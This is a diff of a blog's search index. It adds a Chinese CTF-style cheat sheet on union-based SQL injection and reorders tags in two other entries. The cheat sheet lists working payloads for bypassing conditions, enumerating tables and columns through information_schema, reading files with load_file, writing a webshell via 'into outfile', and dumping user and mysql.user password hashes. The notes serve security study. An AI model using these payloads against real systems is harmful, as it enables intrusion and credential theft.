@@ -3,7 +3,15 @@
   <entry>
     <title><![CDATA[SQL回显注入]]></title>
     <url>%2F2019%2F10%2F20%2FSQL%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5%2F</url>
-    <content type="text"></content>
+    <content type="text"><![CDATA[0x00 注入过程三种注入123where user_id = 1 or 1=1where user_id = &apos;1&apos; or &apos;1&apos;=&apos;1&apos;where user_id =&quot; 1 &quot;or &quot;1&quot;=&quot;1&quot; 注释符12345# 单行注释,常编码为%23--空格 单行注释 注意为短线短线空格/*（）*/ 多行注释 至少存在俩处的注入 /**/常用来作为空格 判断字段数1order by 确定回显点1union select 1,2 查询数据库信息1version() datadir 查询用户名，数据库名12345user() database()1&apos; union select 1,database()#1&apos; union select user(),database()#Version()# 查询表名11&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()# 查询列名121&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273#1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =&apos;users&apos;# 文件读取1union select 1,load_file(&apos;C:\\wondows\\win.ini&apos;)# 写入 webshell1select..into outfile... 猜用户数据1231&apos; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #1&apos; union select null,concat_ws(char(32,58,32),user,password) from users # 1&apos; union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users # 猜 root 用户11&apos; union select 1,group_concat(user,password) from mysql.user#]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>CTF Web</tag>
+        <tag>SQL注入漏洞</tag>
+        <tag>数据库</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[SQL注入总结]]></title>
@@ -90,9 +98,9 @@
       </categories>
       <tags>
         <tag>CTF Web</tag>
-        <tag>PHP伪协议</tag>
         <tag>PHP</tag>
         <tag>后端</tag>
+        <tag>PHP伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -142,9 +150,9 @@
       </categories>
       <tags>
         <tag>CTF Web</tag>
+        <tag>弱类型</tag>
         <tag>PHP</tag>
         <tag>后端</tag>
-        <tag>弱类型</tag>
       </tags>
   </entry>
   <entry>
